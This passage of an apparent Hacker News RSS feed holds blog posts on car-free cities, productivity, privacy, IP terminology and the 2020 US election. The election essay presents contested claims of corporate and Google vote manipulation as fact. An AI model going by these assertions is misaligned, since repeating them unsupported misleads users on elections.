<li><p>Oslo (population 673k) <a href="https://twitter.com/andershartmann/status/1212465415743512576">reduced pedestrian and cyclist deaths in 2019 to 0</a> by making the city centre <a href="https://www.fastcompany.com/90294948/what-happened-when-oslo-decided-to-make-its-downtown-basically-car-free">effectively car free</a>, replacing more than 700 parking spots with bike lanes, plants, parks and benches. Amsterdam, New York, and San Francisco are <a href="https://www.citylab.com/perspective/2019/12/car-free-streets-plans-sf-market-street-new-york-europe-us/603391/">banning cars from their major streets</a>.</p></li>
<li><p>Madrid banned cars from its city centre during the 2018 Christmas period, <a href="https://copenhagenize.eu/news-archive/2019/3/14/the-benefits-of-car-free-streets">increasing retail profit by 9.5%</a>, and they are planning to ban cars from <a href="https://www.businessinsider.com.au/cities-going-car-free-ban-2018-12?r=US&amp;IR=T">500 acres of the city centre this year</a>.</p></li>
<li><p>In <a href="https://www.businessinsider.com.au/cities-going-car-free-ban-2018-12?r=US&amp;IR=T">Paris</a>, the first Sunday of every month is free of cars.</p></li>
</ul>
<p><em>Content warning: Image of food in the gutter of the road.</em></p>
</div><div>







<div><p>Disagree with my argument? Have I missed something or is there a mistake? I'd love to hear, please
contact me at <a href="https://jakecoppinger.blog/cdn-cgi/l/email-protection#066c676d63466c676d63656976766f686163742865696b"><span data-cfemail="90faf1fbf5d0faf1fbf5f3ffe0e0f9fef7f5e2bef3fffd">[email&nbsp;protected]</span></a>. I'm open changing my views if presented with new evidence.
</p></div></div></div>]]>
            </description>
            <link>https://jakecoppinger.blog/articles/the-last-delivery-of-an-ubereats-cyclist-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25196375</guid>
            <pubDate>Tue, 24 Nov 2020 08:14:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Time schedule during the day for better energy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25196130">thread link</a>) | @KlimYadrintsev
<br/>
November 23, 2020 | https://klimy.co/blog/time-schedule-during-the-day-for-better-energy | <a href="https://web.archive.org/web/*/https://klimy.co/blog/time-schedule-during-the-day-for-better-energy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog">
                    <h2>How do you spend your day</h2>
<p>Do you realise that you are much more productive during the morning and day than you are during the evening?</p>
<p>Productivity = Result/Time</p>
<p>If you don’t believe me, you can measure it. Not form the memory but actually measure it with the metrics. I bet you would be surprised.</p>
<p>I have already done a post about <a href="https://klimy.co/blog/morning-routines-of-most-successful-people">Morning Routines of Most Successful People</a> as well as one about <a href="https://klimy.co/blog/how-to-wake-up-early">How to wake up early</a> so if you would like to learn how or why you can do it there.</p>
<p>The main post of this is to tell you that you don’t realise how is your body reacting to the times of the day you are in.</p>
<ul>
<li>When you are feeling tired at around 12 o’clock, and you go for a coffee, that is your body telling you to stop working as it is unproductive. </li>
<li>When you come back from lunch, and you just want to have a nap, that is your body telling you to take a break. </li>
<li>When you are struggling for the last hour just to do some pretend work, or you keep on checking your emails. That is your body telling you to get the hell away from work.</li>
</ul>
<p>You might think that this is all because of your job and that you just don’t enjoy it. The actual reason is that your body’s energy has peaks and throughs and you, as the owner of your body, are responsible for utilising those peaks as much as possible.</p>
<h2>How to improve your energy through the day</h2>
<p>Your homework is to get a blank piece of paper with a pen and put it next to your bed.</p>
<p>When you wake up, you record how long was your sleep and how you felt the day before and once you woke up. Keywords could be: Sleepy, tired, sad, well-rested, energised, happy.</p>
<p>Then you take that piece of paper, and you carry it with you for the whole day.</p>
<p>Every time you have spent a good amount of time working really hard or you were proud of the work that you did. You record the time and place of where and when you did it.</p>
<p>Also every time you feel tired, and you crave caffeine, you record that down: “Feeling tired, 12:15. I want to drink coffee.”</p>
<p>Do that for at least a day. See what you got, what times were you working hard and what times were you down?</p>
<p>That would tell you at what times you should be working and at what times you should be taking a quick 5 to 15-minute break. Believe me, your boss won’t even notice that you are taking a break.</p>
<h2>Mornings and its magic</h2>
<p>Also, you might have found a particular pattern. After lunchtime, you work productively a lot less, and you are feeling tired a lot more. Before lunch, you only might have 1 or 2 slumps.</p>
<p>Well, the reason for that is because as humans are animals of the mornings. We never had any real source of light for tens of thousands of years. Our bodies and brain adapted, that before it is dark, we need to secure the space around us and prepare to sleep so that we can wake up just at the sunrise the next day and carry on with surviving.</p>
<p>Well, if you are waking up not at the sunrise but later, you are basically wasting the precious time of your life. Your body gives an extra-strong boost to your energy in the mornings. If you sleep through that, then only you can blame yourself for that.</p>
<p>I challenge you to take the same blank piece of paper and re-record yourself. But today go to sleep early and wake up much earlier as well. I bet you would be shocked. </p>
<p>Not only will your productively work in the mornings, but you will also feel a lot less tired during the day. This enables you to get your life in a natural rhythm of life where you can spend mornings, working on something significant, something that you actually care and proud about.</p>
<h4>Don’t underestimate mornings</h4>
<p>It is such a magical thing that simply get ignored by most of the population. I think if humanity as a whole put the norm to wake up at 4 or 5, we would have insane progress and much less problem with alcohol and other social problems.</p>
<p>The worst of us come out late at night.</p>
<p>I ask of you to try waking up early. There is no harm.</p>
<p>Start now. Get perfect later.</p>
<p>Klim Y</p> 
                    
                </div></div>]]>
            </description>
            <link>https://klimy.co/blog/time-schedule-during-the-day-for-better-energy</link>
            <guid isPermaLink="false">hacker-news-small-sites-25196130</guid>
            <pubDate>Tue, 24 Nov 2020 07:22:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Last Free Generation (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25196123">thread link</a>) | @lettergram
<br/>
November 23, 2020 | https://austingwalters.com/the-last-free-generation/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/the-last-free-generation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2661">

<div>
<p>My son Atlas is just over nine months old. He’s just started crawling, eating solids, and getting close to saying words.</p>
<p>One thing that’s been troubling me, is that he probably won’t have liberty (freedom) in his lifetime.</p>
<p>Liberty requires a few things:</p>
<ol>
<li>Freedom of Self-Determination</li>
<li>Freedom to Defend Self-Determination</li>
<li>Freedom of Speech</li>
<li>Freedom of Information</li>
<li>Freedom to Privacy</li>
</ol>
<p>All of the above is more-or-less enumerated in the <a href="https://en.wikipedia.org/wiki/United_States_Bill_of_Rights" target="_blank" rel="noopener noreferrer">United States Bill of Rights</a>. The premise of liberty is simple: you have the right to do anything you desire that doesn’t impede others strive for self-determination. Although easily defined, the term “impede” is where the trouble is.</p>
<h2><del>Freedom to</del> Privacy</h2>
<p>Atlas (my son) was born in a world where <em>every single person</em> is tracked to within one meter of where they are at all times (if they have a cell phone). Everyone’s personality is classified, mood tracked, and manipulated at a grand scale.</p>
<p>Hell, as a <a href="https://insideropinion.com/" target="_blank" rel="noopener noreferrer">one man startup</a>, I write systems that predict the moods in real-time of nearly a million people who are communicating on the internet (<a href="https://hnprofile.com/" target="_blank" rel="noopener noreferrer">HNProfile.com</a> &amp; <a href="https://redditprofile.com/" target="_blank" rel="noopener noreferrer">RedditProfile.com</a>). More than that, it can predict moods, identify where they likely live, family, and even <a href="https://news.ycombinator.com/item?id=17940172" target="_blank" rel="noopener noreferrer">de-anonymize them</a>:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o.jpg"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o.jpg" alt="" width="1234" height="321" srcset="https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o.jpg 1234w, https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o-300x78.jpg 300w, https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o-768x200.jpg 768w, https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o-1024x266.jpg 1024w" sizes="(max-width: 1234px) 100vw, 1234px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o.jpg" data-srcset="https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o.jpg 1234w, https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o-300x78.jpg 300w, https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o-768x200.jpg 768w, https://austingwalters.com/wp-content/uploads/2018/11/41384957_10217638849388956_4305601918492737536_o-1024x266.jpg 1024w"></a></p>
<p>What does this mean? When everyone’s thoughts, actions, and moods can be predicted, we can be manipulated. Our government can identify “trouble” makers, the definition of which may change with the political season. Without the freedom to privacy, you don’t have freedom. I don’t see how my son can get that back. Thus, I try to keep as much out of the internet as possible.</p>
<h2><del>Freedom of</del> Information</h2>
<p>Facts… the news claims to report them, we are shown videos, hear audio clips, read documents. Occasionally, we’ve seen “fake” news and information in the past, however there’s something coming that’ll change everything.</p>
<p>Synthetic data (<a href="https://medium.com/capital-one-tech/why-you-dont-necessarily-need-data-for-data-science-48d7bf503074" target="_blank" rel="noopener noreferrer">which I also work on</a>) is also becoming increasingly realistic. Meaning, the term “real news” will take on a whole new meaning. For instance, we can overlay Nicholas Cage on anyones face:</p>
<center><iframe data-lazy-type="iframe" data-src="https://www.youtube.com/embed/BU9YAHigNx8" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></center><p>In addition, we can do this with audio,&nbsp;<a href="https://medium.com/capital-one-tech/why-you-dont-necessarily-need-data-for-data-science-48d7bf503074" target="_blank" rel="noopener noreferrer">text from my work</a>, and I’m working on improved video too…</p>
<p>For this reason, I avoid discussing or posting images of my son on the internet. With a handful of images and a 30 second sound clip, we can start generating synthetic videos and as it relates to privacy, we can construct real-looking scenarios.</p>
<p>What does this mean? When we don’t know what’s real — <em>everything loses meaning</em>. This is the death of freedom of information; poisoning the well so-to-speak. Worse than propaganda, because we can no longer distinguish what is real. Eventually, we will all lose faith in “facts”.</p>
<h2><del>Freedom of</del> Speech</h2>
<p>Increasingly, communication occurs in a few centralized locations: Facebook (Messenger, WhatsApp, Instagram), Twitter, Google Messages, Apple iMessage, Reddit, etc.; accessed via a few devices: Windows, Mac, iPhone, Android; via several service providers: Verizon, AT&amp;T, Comcast, T-Mobile.</p>
<p>Notice, each one of those systems are gatekeepers to communication with the wider world. If they ban you, you’re locked out of your community. Discussions are not “free” on any social network, which arguably is where most of the discussions happening for younger generations. This will likely increasingly be true for people from my sons generation. These are echo chambers, further manipulating free speech. Communities are segregated and if you say something people don’t like…</p>
<figure id="attachment_2666" aria-describedby="caption-attachment-2666"><a href="https://austingwalters.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-05-01-35-51.png" target="_blank" rel="https://www.billboard.com/articles/business/8473944/twitter-bans-alex-jones-infowars-abusive-behavior noopener noreferrer"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-05-01-35-51.png" alt="" width="501" height="501" srcset="https://austingwalters.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-05-01-35-51.png 634w, https://austingwalters.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-05-01-35-51-150x150.png 150w, https://austingwalters.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-05-01-35-51-300x300.png 300w" sizes="(max-width: 501px) 100vw, 501px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-05-01-35-51.png" data-srcset="https://austingwalters.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-05-01-35-51.png 634w, https://austingwalters.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-05-01-35-51-150x150.png 150w, https://austingwalters.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-05-01-35-51-300x300.png 300w"></a><figcaption id="caption-attachment-2666">From: billboard.com</figcaption></figure>
<p>Banning people today may seem minor and deserved, however the implications are massive. Imagine if Twitter and Facebook decided to ban liberals… It would be like silencing half the United States. Although that’s only occurring in rare cases today, it appears to be occurring at an increasing rate lately[<a href="https://news.sky.com/story/twitter-asks-users-if-it-should-ban-dehumanising-speech-11509062" target="_blank" rel="noopener noreferrer">1</a>].</p>
<p>What does this mean? If only three companies control 90% or more of discourse on the internet and those three companies start censoring their user bases, we no longer have free speech within our communities.</p>
<p>Final note on this, when the government [attempts to] prosecute(s) individuals who are whistle blowers (aka <a href="https://en.wikipedia.org/wiki/Edward_Snowden" target="_blank" rel="noopener noreferrer">Edward Snowden</a>) or journalists <em>who aren’t United States citizens</em> (aka <a href="https://en.wikipedia.org/wiki/Julian_Assange" target="_blank" rel="noopener noreferrer">Julian Assange</a>), our ability to practice “freedom of speech” is all but a farce.</p>
<h2><del>Freedom to</del> Defend Self-Determination</h2>
<p>This is a touchy subject for some. The idea is that without the ability to defend your liberties at some point, they’re bound to be taken away. That doesn’t necessarily mean arms (weapons, guns); this includes legal proceedings to defend your rights. Unfortunately, with the <a href="https://www.eff.org/deeplinks/2014/08/what-you-need-know-about-fisa-court-and-how-it-needs-change" target="_blank" rel="noopener noreferrer">FISA court</a>, they can both issue warrants and gag orders, with the court not really answering to anyone. Meaning, there is no way to defend yourself legally.</p>
<p>Historically, this is where arms (weapons, guns) come in. It’s the final, ultimate check to a government. Are we there yet? Not quite, but say the government decided to ban abortion and make it illegal to be LGTB (after so many people have come out)? The only defense those people have will be defending themselves “illegally” with weapons. That’s, in part, why we have that embedded in the constitution of the United States.</p>
<center><iframe data-lazy-type="iframe" data-src="https://www.youtube.com/embed/ufTEtGQZZ9g" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></center><p>What does this mean? To have self-determination, you need to have the means to defend it. Otherwise, you wont have it any more, typically when a tyrannical government comes to power. In the documentary above, a sitting representative, supposedly with the authority to review the NSA has their house broken into… by the very organization(s) it’s supposed to oversee.</p>
<h2><del>Freedom of</del> self-determination</h2>
<p>With the above eroded away, with <a href="https://www.theatlantic.com/technology/archive/2014/06/everything-we-know-about-facebooks-secret-mood-manipulation-experiment/373648/" target="_blank" rel="noopener noreferrer">mood manipulation</a> prevalent, 24/7 real-time surveillance, from devices we even install ourselves…</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2018/11/w9eLjgT.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2018/11/w9eLjgT.png" alt="" width="602" height="574" srcset="https://austingwalters.com/wp-content/uploads/2018/11/w9eLjgT.png 684w, https://austingwalters.com/wp-content/uploads/2018/11/w9eLjgT-300x286.png 300w" sizes="(max-width: 602px) 100vw, 602px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2018/11/w9eLjgT.png" data-srcset="https://austingwalters.com/wp-content/uploads/2018/11/w9eLjgT.png 684w, https://austingwalters.com/wp-content/uploads/2018/11/w9eLjgT-300x286.png 300w"></a>What hope does my son have? Self-determination requires we have access to information, the ability to choose the way we live (including privately), the ability we can decide who, what, where, when why we do what we do.</p>
<p>I was born free. My father was born free. My grand-father was born free.</p>
<p>We didn’t always have welfare, social security, and other forms of security. We’ve always had terrorism, and the risks of life. To a large degree, our society (and world) has tried to leave this Earth, better than we left it. Unfortunately, it appears as our society grows — it is suffocating what it strives to protect: life &amp; liberty.</p>
<p>Today, my son has no hope for liberty.</p>
<p>All I can do, is provide him the best opportunity for privacy I can. I don’t upload his photos, I’m working on these systems so I can control their development, I donate to the EFF, and I do my best to inform others. I’ll fight for change, but the first step is to inform.</p>
<h3>Related Articles</h3>
<ol>
<li><a href="https://austingwalters.com/is-search-solved/">Is search Solved?</a></li>
<li><a href="https://austingwalters.com/song-cannot-remember/">The Song I can’t Remember</a></li>
<li><a href="https://austingwalters.com/a-new-way-to-invest/">A new way to invest</a></li>
<li><a href="https://austingwalters.com/an-essay-on-wealth-and-freedom/">An Essay on Wealth and Freedom</a></li>
<li><a href="https://austingwalters.com/maximizing-learning-how-audiobooks-can-change-your-life/">Maximizing Learning – How Audiobooks Can Change Your Life</a></li>
</ol>

</div>

</article></div>]]>
            </description>
            <link>https://austingwalters.com/the-last-free-generation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25196123</guid>
            <pubDate>Tue, 24 Nov 2020 07:21:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Patent, Trademark or Copyright?: Get Your IP Terminology Straight (2017)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25195992">thread link</a>) | @Tomte
<br/>
November 23, 2020 | https://www.knowmad.law/single-post/2017/05/30/patent-trademark-or-copyright-get-your-ip-terminology-straight | <a href="https://web.archive.org/web/*/https://www.knowmad.law/single-post/2017/05/30/patent-trademark-or-copyright-get-your-ip-terminology-straight">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.5.0"><div dir="ltr"><div><div id="viewer-3ccc1"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label=""><p><img data-pin-url="https://www.knowmad.law/single-post/2017/05/30/patent-trademark-or-copyright-get-your-ip-terminology-straight" data-pin-media="https://static.wixstatic.com/media/192a90e155664d2b84e9ccddafe7454e.jpg/v1/fit/w_500%2Ch_333%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/192a90e155664d2b84e9ccddafe7454e.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg" alt=""></p></div></div></div></div><p id="viewer-irno"><span>The terms “patent,” “trademark,” and “copyright” are often used interchangeably in everyday conversation.  Even media reports about intellectual property sometimes get the terms mixed up. But, to IP practitioners, they represent very different concepts.

This can lead to some initial confusion when business owners contact an IP firm to discuss protecting their intangible assets. If you want to go in with some handle on the jargon, not to worry. Knowmad Law is here with some simple pointers.</span></p><p id="viewer-els3f"><span><strong>Patents</strong></span></p><p id="viewer-fvt5e"><span>Attorneys must have a science background and pass a special bar exam to file patent applications. In many firms patent <a href="https://www.knowmad.law/glossary" target="_top" rel="noopener">prosecution</a> is an entirely separate practice group from trademark, copyright and trade secret matters (sometimes somewhat-condescendingly referred to as “soft IP”). When people talk about “patents,” they’re usually talking about utility patents, but, confusingly, U.S. law also recognizes design patents and <a href="https://www.knowmad.law/post/plantpatents" target="_top" rel="noopener noreferrer"><u>plant patents</u></a>, which are technically subcategories of patent but may be better thought of as separate forms of IP.</span></p><p id="viewer-b40ff"><span><em><strong>What it protects: </strong></em>new and useful inventions, including machines and processes</span></p><p id="viewer-ar8ft"><span><em><strong>Why it exists: </strong></em>to incentivize innovation</span></p><p id="viewer-59bk8"><span><em><strong>How you get it: </strong></em>application to USPTO</span></p><p id="viewer-3hst6"><span><em><strong>What it gives you:</strong></em> the exclusive right to sell, make or use an invention for 20 years</span></p><p id="viewer-4h0if"><span><strong>Copyright</strong></span></p><p id="viewer-7v4s4"><span>Unlike patents and trademarks, there isn’t really a discreet unit of intellectual property known as “a copyright” (though the term is often used as shorthand for “copyright registration”). Instead, we find it preferable to think of “copyright” as an uncountable noun like “knowledge” and to discuss our clients’ copyright portfolios in terms of <em>works subject to copyright</em>.</span></p><p id="viewer-6b4oo"><span><em><strong>What it protects:</strong></em> works of creative expression, including any original text, graphic, audio or video content</span></p><p id="viewer-b3v8k"><span><em><strong>Why it exists:</strong></em> to incentivize creative activity</span></p><p id="viewer-fbl0u"><span><em><strong>How you get it:</strong></em> creating something (registration with Library of Congress grants additional rights)</span></p><p id="viewer-efncf"><span><em><strong>What it gives you: </strong></em>the exclusive right to reproduce, distribute or display a work for 70 years after your death (or 95 years for institutional authors)</span></p><p id="viewer-jvde"><span><strong>Trademarks</strong></span></p><p id="viewer-8ue5u"><span>Trademark law is rooted in consumer protection and market regulation. This is an important distinction from patents and copyright, which are essentially government bounties to reward inventors and artists. Whereas the Patent Act and Copyright Act are based upon a <a href="http://en.wikipedia.org/wiki/Copyright_Clause" target="_blank" rel="noopener">specific provision of the U.S. Constitution </a>directed to encouraging “science and the useful arts,” Congress relied on the regular old <a href="http://en.wikipedia.org/wiki/Commerce_Clause" target="_blank" rel="noopener">Commerce Clause</a> to pass the Trademark Act.</span></p><p id="viewer-2jqe6"><span><em><strong>What it protects:</strong></em> indications of origin for goods and services, including words and symbols</span></p><p id="viewer-1a3h"><span><em><strong>Why it exists:</strong></em> to prevent consumer confusion and deceptive business practices</span></p><p id="viewer-e9av4"><span><em><strong>How you get it: </strong></em>using a mark to sell or market particular goods or services (registration with USPTO grants additional rights)</span></p><p id="viewer-1pl7q"><span><em><strong>What it gives you:</strong></em> the right to prevent others from using similar marks to sell or market related goods or services</span></p><p id="viewer-34nun"><span><strong>Trade Secrets</strong></span></p><p id="viewer-cquao"><span>Rounding out the “big four” of intellectual property are trade secrets. Though less often discussed than patents, trademarks and copyright, trade secrets are often the only way to protect a business’s most valuable assets.</span></p><p id="viewer-a2oov"><span><em><strong>What it protects:</strong></em> valuable and confidential information</span></p><p id="viewer-epc8h"><span><em><strong>Why it exists:</strong></em> to prevent unfair business practices</span></p><p id="viewer-64v3l"><span><em><strong>How you get it: </strong></em>keeping the information secret</span></p><p id="viewer-6m0m0"><span><em><strong>What it gives you: </strong></em>a claim against anyone who obtains or spreads the information by improper means</span></p><p id="viewer-d3rvm"><span>There’s a certain amount of overlap between these spheres of protection. For example, a company might use a trademark to market its patented technology. Or a computer process might be the subject of a patent, while the specific code used to implement the process is covered by copyright. In both cases, these tangential rights would persist after the patent expires.</span></p></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.knowmad.law/single-post/2017/05/30/patent-trademark-or-copyright-get-your-ip-terminology-straight</link>
            <guid isPermaLink="false">hacker-news-small-sites-25195992</guid>
            <pubDate>Tue, 24 Nov 2020 06:51:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crossing the Rubicon]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25195974">thread link</a>) | @lettergram
<br/>
November 23, 2020 | https://austingwalters.com/crossing-the-rubicon/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/crossing-the-rubicon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3793">

<div>
<p>The phrase: “Crossing the Rubicon” refers to when Julius Caesar crossed the Rubicon river with a legion on January 10, 49 BC, leading to the Roman Civil War.</p>
<p>At the time of writing, the United States is at that cross roads. Make no mistake, we are witnessing a power struggle, one which could easily lead to armed conflict across the United States and perhaps the world.</p>
<p>I believe most people believe this is due to Donald Trump; perhaps. However, I contend it’s actually much deeper. Rather than Trump, I believe the corporations have crossed the Rubicon, effectively electing Joe Biden. I’m not confident it was coordinated, but it does appear there has been a concerted effort to elect Joe Biden (influencing our news). We can all see it.</p>
<p>In November 2018, I wrote “<a href="https://austingwalters.com/the-last-free-generation/" target="_blank" rel="noopener noreferrer">The Last Free Generation</a>” about how this is the last generation that will have freewill. What I didn’t expect was the 2020 elections to be so obvious.</p>
<blockquote><p>For reference: I would never vote for Trump. I believe his character is too divisive and a leader who can’t unite is not a leader.</p></blockquote>
<h2>Censorship in 2020</h2>
<p>The 2020 elections are astonishing. It is the first election I’ve experienced where literally there was a media blacking out a president. Quite literally, Donald Trump was regularly taken off the air.</p>
<center><iframe data-lazy-type="iframe" data-src="https://www.youtube.com/embed/nUVkFvcN08o" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></center><p>Even my posts are regularly flagged on Hacker News (all of them were flagged at one point by the community, many decisions were reversed by the community or <a href="https://news.ycombinator.com/submitted?id=dang" target="_blank" rel="noopener noreferrer">Dang</a>)</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-23-21-19-53.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-23-21-19-53.png" alt="" width="618" height="245" srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-23-21-19-53.png 618w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-23-21-19-53-300x119.png 300w" sizes="(max-width: 618px) 100vw, 618px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-23-21-19-53.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-23-21-19-53.png 618w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-23-21-19-53-300x119.png 300w"></a>Dorsey even said he was censoring real stories (the <a href="https://www.finance.senate.gov/imo/media/doc/2020-11-18%20HSGAC%20-%20Finance%20Joint%20Report%20Supplemental.pdf" target="_blank" rel="noopener noreferrer">Hunter Biden Laptop)</a>:</p>
<center><iframe data-lazy-type="iframe" data-src="https://www.youtube.com/embed/tWayExRuaYk" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></center><p>So what? Dorsey later corrected himself, Donald Trump was claiming inaccurate information.</p>
<p>The problem is it manipulated the information people viewed. It was clearly election interference, to remove unfavorable information about a given candidate. There’s similarly a pinned tweet from President Trump.</p>
<blockquote data-width="550" data-dnt="true">
<p lang="und" dir="ltr"><a href="https://t.co/Za1BByChjN">pic.twitter.com/Za1BByChjN</a></p>
<p>— Donald J. Trump (@realDonaldTrump) <a href="https://twitter.com/realDonaldTrump/status/1331057517095489539?ref_src=twsrc%5Etfw">November 24, 2020</a></p></blockquote>

<p>In the video, there is a claim that Google intentionally did not provide voter notifications to conservatives, while liberals were receiving voter notifications. Search history was being adjusted, websites blocked, etc. There was a 700+ person study and there’s solid evidence.</p>
<h2>The Executive Order</h2>
<p>What I think many have missed is the <a href="https://www.whitehouse.gov/presidential-actions/executive-order-imposing-certain-sanctions-event-foreign-interference-united-states-election/" target="_blank" rel="noopener noreferrer">Executive Order on Imposing Certain Sanctions in the Event of Foreign Interference in a United States Election</a>. The introduction,</p>
<blockquote><p>I, DONALD J. TRUMP, President of the United States of America, find that the ability of persons located, in whole or in substantial part, outside the United States to interfere in or undermine public confidence in United States elections, including through the unauthorized accessing of election and campaign infrastructure or the covert distribution of propaganda and disinformation, constitutes an unusual and extraordinary threat to the national security and foreign policy of the United States. Although there has been no evidence of a foreign power altering the outcome or vote tabulation in any United States election, foreign powers have historically sought to exploit America’s free and open political system. In recent years, the proliferation of digital devices and internet-based communications has created significant vulnerabilities and magnified the scope and intensity of the threat of foreign interference, as illustrated in the 2017 Intelligence Community Assessment. I hereby declare a national emergency to deal with this threat.</p></blockquote>
<p>There’s a pretty good video on this, see video below:</p>
<center><iframe data-lazy-type="iframe" data-src="https://www.youtube.com/embed/p2MkvWh7poY" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></center><p>Effectively, in 45 days of the election; we’re likely to see a report on any foreign interference in the United States election.</p>
<p>For something to be considered “foreign interference” one of the following criteria must be met:</p>
<blockquote><p>(i) to have directly or indirectly engaged in, sponsored, concealed, or otherwise been complicit in foreign interference in a United States election;</p>
<p>(ii) to have materially assisted, sponsored, or provided financial, material, or technological support for, or goods or services to or in support of, any activity described in subsection (a)(i) of this section or any person whose property and interests in property are blocked pursuant to this order; or</p>
<p>(iii) to be owned or controlled by, or to have acted or purported to act for or on behalf of, directly or indirectly, any person whose property or interests in property are blocked pursuant to this order.</p></blockquote>
<p>Unfortunately, for tech companies &amp; media companies it’s quite possible this criteria is met (see subsection iii on “acted or purported to act for or on behalf of, directly or indirectly”).</p>
<h2>Where is Barr?</h2>
<p>On October 20, 2020, many states and the federal government of the United States <a href="https://www.npr.org/2020/10/20/925736276/google-abuses-its-monopoly-power-over-search-justice-department-says-in-lawsuit" target="_blank" rel="noopener noreferrer">filed an antitrust lawsuit against Google</a>. At the time, <a href="https://www.nbcnews.com/politics/justice-department/justice-department-11-states-accuse-google-antitrust-violations-n1244005" target="_blank" rel="noopener noreferrer">many including Google</a>, claimed it would not be effective; the lawyers even said they were not prepared. What if it’s about the lawsuits, but it’s also about implicating Google in manipulations of the elections. When a lawsuit of this kind is filed, discovery is allotted. Barr was animate about doing the initial lawsuit <a href="https://www.nytimes.com/2020/09/03/us/politics/google-antitrust-justice-department.html?referringSource=articleShare" target="_blank" rel="noopener noreferrer">before the election.</a></p>
<p>From the public hearings with Zuckerberg and Dorsey, they implicated their companies (and themselves) in suppressing stories (inaccurately I might add) and with the discovery allotted from the lawsuit brought by Barr, they now have the all three of them “red handed” and that executive order can be utilized to it’s full effect.</p>
<h2>Closing Thoughts</h2>
<p>I’m not saying Trump will utilize this executive order. However, he has the authority to do so until December 18, 2020 (45 days after the election). I would not at all be surprised if a plan is executed to seriously cripple the media and at the same time he presents his claims of election fraud (not claiming they’re true one way or the other).</p>

</div>

</article></div>]]>
            </description>
            <link>https://austingwalters.com/crossing-the-rubicon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25195974</guid>
            <pubDate>Tue, 24 Nov 2020 06:49:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India's WhiteHat Jr is startup hell]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25195938">thread link</a>) | @mihir6692
<br/>
November 23, 2020 | https://themorningcontext.com/internet/indias-whitehatjr-is-startup-hell | <a href="https://web.archive.org/web/*/https://themorningcontext.com/internet/indias-whitehatjr-is-startup-hell">archive.org</a>
